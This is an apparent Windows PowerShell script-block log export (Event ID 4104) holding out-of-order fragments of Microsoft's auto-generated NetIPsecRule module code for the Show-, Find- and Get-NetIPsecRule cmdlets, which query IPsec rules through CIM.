    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('ByIPsecRuleName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Mode') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Mode})
        $__cmdletization_queryBuilder.FilterByProperty('Mode', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('InboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('InboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('OutboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${OutboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('OutboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${QuickModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('QuickModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase2AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase2AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase2AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('KeyModule') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${KeyModule})
        $__cmdletization_queryBuilder.FilterByProperty('KeyModule', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowWatchKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowWatchKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowWatchKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowSetKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowSetKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowSetKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteTunnelHostname})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteTunnelEndpointDNSName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForwardPathLifetime') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForwardPathLifetime})
        $__cmdletization_queryBuilder.FilterByProperty('MaxReturnPathL

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 23):
tization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Dependents'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/NetSecurityDeepEnumElement'
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('EnumerateFull', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Show-NetIPsecRule' -Alias '*'
        

function Find-NetIPsecRule
{
    [CmdletBinding(PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])]
    param(
    
    [Parameter(ParameterSetName='Find2')]
    [string]
    ${LocalAddress},

    [Parameter(ParameterSetName='Find2', Mandatory=$true)]
    [string]
    ${RemoteAddress},

    [Parameter(ParameterSetName='Find2')]
    [string]
    ${Protocol},

    [Parameter(ParameterSetName='Find2')]
    [uint16]
    ${LocalPort},

    [Parameter(ParameterSetName='Find2')]
    [uint16]
    ${RemotePort},

    [Parameter(ParameterSetName='Find2')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Find2')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Find2')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalAddress')) {
          [object]$__cmdletization_value = ${LocalAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalAddress'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalAddress'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteAddress')) {
          [object]$__cmdletization_value = ${RemoteAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteAddress'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteAddress'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Protocol')) {
          [object]$__cmdletization_value = ${Protocol}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalPort')) {
          [object]$__cmdletization_value = ${LocalPort}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPort'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPort'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemotePort')) {
          [object]$__cmdletization_value = ${RemotePort}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemotePort'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemotePort'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Find', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Find-NetIPsecRule' -Alias '*'
        

function Get-NetIPsecRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]

    param(
    
    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode[]]
    ${Mode},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecIn')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${InboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecOut')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule[]]
    ${KeyModule},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowWatchKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowSetKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${User},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Machine},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 23):
aultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RequireAuthorization')) {
          [object]$__cmdletization_value = ${RequireAuthorization}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequireAuthorization'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequireAuthorization'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('User')) {
          [object]$__cmdletization_value = ${User}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Users'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Users'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Machine')) {
          [object]$__cmdletization_value = ${Machine}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Machines'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Machines'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalAddress')) {
          [object]$__cmdletization_value = ${LocalAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteAddress')) {
          [object]$__cmdletization_value = ${RemoteAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Protocol')) {
          [object]$__cmdletization_value = ${Protocol}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalPort')) {
          [object]$__cmdletization_value = ${LocalPort}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemotePort')) {
          [object]$__cmdletization_value = ${RemotePort}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('InterfaceAlias')) {
          [object]$__cmdletization_value = ${InterfaceAlias}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceAlias'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceAlias'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('InterfaceType')) {
          [object]$__cmdletization_value = ${InterfaceType}
